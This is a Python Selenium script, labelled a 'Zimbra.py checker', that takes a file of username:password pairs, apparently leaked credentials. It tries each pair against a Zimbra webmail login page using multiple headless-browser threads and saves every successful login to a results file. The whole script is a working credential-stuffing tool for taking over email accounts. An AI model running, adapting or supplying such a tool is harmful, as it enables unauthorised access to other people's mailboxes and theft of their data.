#!/usr/bin/python3

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from time import sleep
from colorama import Fore, Back, Style, init
import random
import sys
import time
import threading
import argparse

filename = "resultados.txt"
users = {}

def extractUsers(ruta):
    users = {}
    contador = 0

    with open(ruta, 'r') as f:
        lineas = f.readlines()

    for line in lineas:
        contador += 1
        line = line.strip()
        parts = line.split(':')

        if len(parts) >= 2:
            password = parts[-1]
            user = parts[-2]

            if user in users:
                users[user].append(password)
            else:
                users[user] = [password]

    print(Fore.BLUE + "[*] " + Fore.GREEN + "Se han encontrado %i resultados..." % contador + Style.RESET_ALL)

    return users


def consultarUser():
    global users
    user = random.choice(list(users.keys())) 
    password = ""

    if variasPasswords(user) == True:
        password = random.choice(users[user])
        users[user].remove(password)
        return user, password
    else:
        password = users[user][0]
        del users[user]
        return user, password   

def variasPasswords(usuario):
    global users
    if usuario in users and len(users[usuario]) > 1:
        return True
    else:
        return False

def contadorPasswords():
    global users
    total_contraseñas = sum(len(contraseñas) for contraseñas in users.values())
    return total_contraseñas

def testZimbra(url):
    global filename
    global users
    errorcode = "The username or password is incorrect."

    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--start-maximized')
    options.add_argument('--disable-extensions')

    driver = webdriver.Chrome(options=options)
    clogins = 0

    driver.get(url)

    while users:
        username, password = consultarUser()

        driver.find_element(By.CSS_SELECTOR, "input#username").clear()
        driver.find_element(By.CSS_SELECTOR, "input#password").clear()

        WebDriverWait(driver, 5)\
            .until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'input#username')))\
            .send_keys(username)

        WebDriverWait(driver, 5)\
            .until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'input#password')))\
            .send_keys(password)

        WebDriverWait(driver, 5)\
            .until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'input.ZLoginButton.DwtButton')))\
            .click()

        sleep(1)

        htmlcode = driver.page_source

        linea = f"{username}:{password}"

        if errorcode in driver.page_source:
            print(f"{Fore.RED}[!] ERROR: {linea}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[*] OK: {linea}{Style.RESET_ALL}")

            with open(filename, 'a') as file:
                file.write(f"OK {linea}")

            clogins += 1
            sleep(5)
            driver.delete_all_cookies()
            driver.get(url)
        
        contador = contadorPasswords()

        if contador % 10 == 0 or contador % 10 == 5:
            print(f"{Fore.BLUE}[*] Quedan:{Fore.GREEN} {contador}{Fore.BLUE} logins por probar, han funcionado {Fore.GREEN}{clogins}{Fore.BLUE}.{Style.RESET_ALL}")

    sleep(2)
    driver.quit()

def main(ruta, url, numThreads):
    global users
    global filename
    try:
        users = extractUsers(args.ruta) 
    except:
        print(f"{Fore.RED}[!] {args.ruta} does not exists!{Style.RESET_ALL}")
        sys.exit(1)

    threads = []

    for i in range(int(numThreads)):
        thread = threading.Thread(target=testZimbra, args=(url,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

    print(f"\n\n{Fore.GREEN}[*]{Fore.GREEN}{Fore.BLUE} El programa ha terminado correctamente su ejecucion, se han guardado los resultados en {Fore.RED}{filename}{Style.RESET_ALL}")
    exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="<./zimbra.py> -> Zimbra.py checker")
    parser.add_argument("ruta", nargs="?", help="Nombre del archivo")
    parser.add_argument("-U", "--url", required=True, help="<./zimbra.py> <rutaArchivo> -U <url> - Ingresa la URL para el metodo Post")
    parser.add_argument("-t", "--threads", help="<./zimbra.py> <rutaArchivo> -t <1-100>", default=1)
    args = parser.parse_args()
    
    main(args.ruta, args.url, args.threads)
